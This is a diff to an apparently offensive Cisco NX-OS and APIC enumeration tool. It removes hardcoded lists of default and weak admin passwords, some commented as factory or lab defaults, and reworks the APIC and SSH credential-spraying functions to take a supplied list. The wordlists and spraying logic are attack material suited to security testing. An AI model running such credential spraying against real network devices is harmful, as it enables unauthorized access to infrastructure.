@@ -171,37 +171,6 @@ NXOS_ENUM_COMMANDS = [
     "show inventory",
 ]
 
-# Default credentials for NX-OS — no hardcoded default password;
-# admin password is set at first boot. These are common weak passwords.
-NXOS_DEFAULT_CREDS = [
-    ("admin", "admin"),
-    ("admin", "Admin1234!"),
-    ("admin", "cisco"),
-    ("admin", "cisco123"),
-    ("admin", "Cisco123!"),
-    ("admin", "password"),
-    ("admin", ""),
-    ("cisco", "cisco"),
-]
-
-# APIC-specific default credentials.
-# ins3965! — Cisco factory default set during APIC first-boot wizard
-#             before the operator completes setup (CIMC/iDRAC stage).
-# C1sco12345 — common Cisco TAC / lab default; appears in CVE PoCs
-#              and older APIC installation guides.
-# cisco123   — used in Cisco official training materials (Zero to Hero,
-#              CCNP ACI) as the canonical demo password.
-# admin/password — CIMC (Cisco IMC) default before setup wizard completion.
-APIC_DEFAULT_CREDS = [
-    ("admin", "ins3965!"),
-    ("admin", "C1sco12345"),
-    ("admin", "cisco123"),
-    ("admin", "cisco"),
-    ("admin", "Admin1234!"),
-    ("admin", "admin"),
-    ("admin", "password"),
-    ("admin", ""),
-]
 
 
 # SSL context that skips cert validation
@@ -329,14 +298,10 @@ def apic_login(apic_host: str, username: str, password: str) -> Optional[str]:
         return None
 
 
-def apic_brute_creds(apic_host: str) -> dict:
-    """Try common NX-OS/APIC credential pairs against APIC login.
-
-    Tries APIC_DEFAULT_CREDS first (APIC-specific), then NXOS_DEFAULT_CREDS.
-    APIC factory default is admin/ins3965! before setup wizard completes.
-    """
+def apic_brute_creds(apic_host: str, creds: list = None) -> dict:
+    """Try credential pairs against APIC login."""
     result = {"success": False, "username": None, "password": None, "token": None}
-    for user, pwd in (APIC_DEFAULT_CREDS + NXOS_DEFAULT_CREDS):
+    for user, pwd in (creds or []):
         token = apic_login(apic_host, user, pwd)
         if token:
             result["success"] = True
@@ -1485,8 +1450,9 @@ def probe_dcnm(host: str) -> dict:
 class NXOSEnumerator:
     """Cisco NX-OS, ACI/APIC, and VXLAN enumeration for Ablation."""
 
-    def __init__(self, targets):
+    def __init__(self, targets, creds: list = None):
         self.targets = targets
+        self.creds = creds or []
         self.findings = []
 
     def run(self) -> dict:
@@ -1531,7 +1497,7 @@ class NXOSEnumerator:
                 results["apic_unauthenticated"].append(unauth)
 
                 if unauth["reachable"]:
-                    cred_result = apic_brute_creds(host)
+                    cred_result = apic_brute_creds(host, self.creds)
                     cred_result["host"] = host
                     results["apic_credential_spray"].append(cred_result)
 
@@ -1576,7 +1542,7 @@ class NXOSEnumerator:
                 banner = probe_nxos_ssh_banner(host)
                 results["nxos_ssh_banners"].append({"host": host, "banner": banner})
 
-                for user, pwd in NXOS_DEFAULT_CREDS[:4]:
+                for user, pwd in (self.creds or []):
                     ssh_result = run_nxos_commands(host, user, pwd,
                                                     commands=["show version", "show license host-id", "show users"])
                     if ssh_result["authenticated"]:
